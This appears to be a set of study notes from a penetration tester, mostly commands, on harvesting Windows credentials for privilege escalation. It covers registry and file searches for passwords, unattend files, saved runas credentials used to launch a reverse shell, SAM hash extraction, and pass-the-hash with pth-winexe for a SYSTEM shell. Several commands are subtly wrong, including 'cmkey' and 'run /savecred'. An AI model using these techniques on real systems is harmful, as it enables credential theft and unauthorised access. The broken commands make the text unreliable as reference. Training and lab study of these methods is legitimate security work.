### Registry
Can can contain password for insecure services.
[reg](../Commands/reg.md)
```powershell
# search for password in either keyname or keyvalue recursively
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### Saved Creds
- Windows can allow user to save their password with runas.exe command.
- Can be queried with:
```powershell
# list already saved key
cmkey /list

# use the cred to run reverse shell as that user.
run /savecred /user:<username> C\reverse.exe

```

### Unattended Windows Installation
When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:

```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```
```xml
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```
As part of these files, you might encounter credentials:
```powershell
dir /s *pass* == *.config
```
- Searching for files that contains the word `password` and also ends in either `.xml` `.ini` or `.txt`
```powershell
findstr /si password *.xml *.ini *.txt
```

### SAM
- Security Accounts Manager
- Used for storing password hashes
- Encrypted using key found inside the file `SYSTEM`
- If SAM and SYSTEM is readable, it is possible to read hashes
- Located at `C:\Windows\System32\config` directory
- Locked while windows is running.
- Backup can be found at 
```powershell
C:\Windows\Repair
C:\windows\System32\config\RegBack
```
- Creddump7 can be used to fetch hashes from both the field.
> Hash that start with `31d6` means that either the account has no password or the account is deactivated.
- If hashes are not crackable, path-the-hash method can be used to login to the system.
- pth-winexe version of the winexe can be used to perform pass-the-hash attacks
```powershell
# hash should be both NL and LM hash
# add --system to get a SYSTEM level shell 
.\pth-winexe -U 'admin%<hash>' //<ip> cmd.exe
```

### Powershell History
Can be found in the below location: 
cmd:
```cmd
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
powershell:
```powershell
$Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### IIS Configuration Files
- Default web server in on windows installation.
- Configuration is stored in `web.config`, preferebly in the variable `connectionstring`
- `web.config` is stored in:
```powershell
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

### PuTTY
- Putty can store proxy configuration in registry keys that includes cleartext authentication details.
- They are stored in :
```powershell
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
